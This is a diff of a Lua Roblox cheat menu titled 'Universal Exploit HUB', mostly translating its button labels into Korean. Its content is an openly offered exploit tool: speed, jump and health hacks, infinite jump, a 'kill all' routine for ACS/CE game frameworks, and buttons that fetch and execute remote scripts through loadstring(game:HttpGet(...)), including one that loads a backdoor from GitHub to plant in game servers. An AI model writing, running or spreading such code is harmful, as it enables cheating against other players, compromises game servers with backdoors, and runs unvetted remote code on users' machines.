@@ -3,7 +3,7 @@ local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
     Name = "Universal Exploit HUB",
     LoadingTitle = "잼민겜 Fucking",
-    LoadingSubtitle = "by DJP",
+    LoadingSubtitle = "by 전두광",
     ConfigurationSaving = {
        Enabled = true,
        FolderName = nil, -- Create a custom folder for your hub/game
@@ -47,7 +47,7 @@ local Window = Rayfield:CreateWindow({
 
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "Speed",
+    Name = "스피드",
     Range = {0, 350},
     Increment = 10,
     Suffix = "Speed",
@@ -59,7 +59,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = PlayerTab:CreateButton({
-    Name = "Infjump",
+    Name = "축지법",
     Callback = function()
         _G.infinjump = not _G.infinjump
 
@@ -88,7 +88,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "JumpPower",
+    Name = "점프",
     Range = {1, 350},
     Increment = 1,
     Suffix = "Power",
@@ -100,7 +100,7 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Slider = PlayerTab:CreateSlider({
-    Name = "Health",
+    Name = "체력",
     Range = {1, 99999999999},
     Increment = 1,
     Suffix = "Health",
@@ -126,14 +126,14 @@ local Window = Rayfield:CreateWindow({
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "BackDoor",
+    Name = "백도어 심기",
     Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
     end,
  })
 
  local Button = scriptTab:CreateButton({
-    Name = "Acs, Ce Kill all",
+    Name = "짭부대 킬올 [Acs, Ce]",
     Callback = function()
       local Players = game:GetService("Players")
       local LocalPlayer = Players.LocalPlayer
@@ -202,12 +202,5 @@ local Button = PlayerTab:CreateButton({
    Name = "Fly",
    Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
-   end,
-})
-
-local Button = PlayerTab:CreateButton({
-   Name = "Spin",
-   Callback = function()
-       loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
    end,
 })
